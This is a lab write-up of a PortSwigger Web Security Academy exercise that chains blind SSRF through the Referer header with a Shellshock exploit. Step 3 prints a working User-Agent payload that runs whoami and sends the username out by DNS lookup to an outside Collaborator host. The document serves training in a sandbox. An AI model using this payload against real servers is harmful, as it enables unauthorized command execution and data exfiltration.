# 🧠 Blind SSRF with Shellshock Exploitation  
*A technical walkthrough within PortSwigger’s Web Security Academy*

## 🧾 1. Introduction  
This document outlines the methodology and execution of a **Blind Server-Side Request Forgery (SSRF)** attack, augmented with a **Shellshock** vulnerability exploit, performed inside a **sandboxed lab environment** provided by [PortSwigger Web Security Academy](https://portswigger.net/web-security).
The target web application includes an analytics mechanism that fetches resources based on the value of the `Referer` header. By carefully crafting an HTTP request and injecting a malicious payload into the `User-Agent` header, the attacker can coerce an internal server to exfiltrate its operating system username via a DNS query.

## 🛠️ 2. Environment and Tooling  
| Component                  | Description                                              |
|----------------------------|----------------------------------------------------------|
| ⚙️ Burp Suite Professional | Proxy, Repeater, and Collaborator toolset                |
| 🌐 Firefox Browser          | Configured with FoxyProxy to intercept lab traffic       |
| 📡 Burp Collaborator        | Used to receive DNS interactions from the internal server|
| 🔒 Target IP Range          | Internal host: `192.168.0.X` on port `8080`              |

## 🔍 3. Assessment Methodology
### ⚙️ Step 1: Initial Setup  
- Accessed the PortSwigger lab and confirmed Burp Suite interception through Firefox using FoxyProxy.  
- Navigated to any product page in the application interface to trigger analytics behavior.
### 🔎 Step 2: Identifying the Target Request  
- In Burp Suite, captured the HTTP request via `Proxy → HTTP History`.  
- Found a relevant GET request:  
  ```http
  GET /product?productId=1 HTTP/1.1
  ```  
- Forwarded this request to Burp Repeater for payload injection.

### 💣 Step 3: Injecting the Shellshock Payload  
Two critical headers were modified to exploit the vulnerability:
- **User-Agent Header (Shellshock Injection):**  
  ```http
  User-Agent: () { :; }; nslookup $(whoami).<burp-collab-subdomain>.oastify.com
  ```
  - The payload triggers an OS-level command (`nslookup`) via Shellshock.
  - `<burp-collab-subdomain>` is your Burp Collaborator subdomain.
- **Referer Header (SSRF Targeting):**  
  ```http
  Referer: http://192.168.0.1:8080/
  ```

### 🚀 Step 4: Executing the Attack  
- Sent the manipulated request through Burp Repeater.  
- Opened Burp Collaborator and clicked the “Pull now” button to retrieve DNS interactions.

## 📈 4. Observed Outcome  
Upon successful exploitation, Burp Collaborator captured an incoming DNS query:
```
The Collaborator server received a DNS lookup of type A for the domain:
peter-RTlAqV.514b3j0lgnogbtazccdei20e55bzzpne.oastify.com
```
- The internal OS username extracted:  
  ```text
  peter-RTlAqV
  ```
- Submitted this value to the lab interface and successfully completed the challenge.

## 🧩 5. Security Implications  
This exercise demonstrates how indirect attack vectors—such as analytics scripts leveraging `Referer` headers—can be weaponized to interact with internal services. Blind SSRF attacks are especially dangerous when they’re paired with Remote Code Execution (RCE) vectors like Shellshock, making it possible to leak data from otherwise unreachable components of server infrastructure.

## ✅ 6. Final Takeaway  
Combining SSRF with Shellshock in a blind context allows attackers to:
- Influence internal routing paths via header manipulation  
- Trigger OS-level commands through vulnerable services  
- Exfiltrate data invisibly using DNS interactions  
This lab underscores the importance of sanitizing header values and isolating internal services from public-facing components.

## 🛡️ 7. Disclaimer
This documentation has been prepared strictly for **educational and research purposes**. All actions were performed inside a **controlled environment** provided by PortSwigger Web Security Academy, under its terms of use.
The information presented should **not be misused** to target live systems or unauthorized infrastructure. Any real-world application of the discussed techniques must adhere to responsible disclosure practices and all relevant legal and ethical standards.
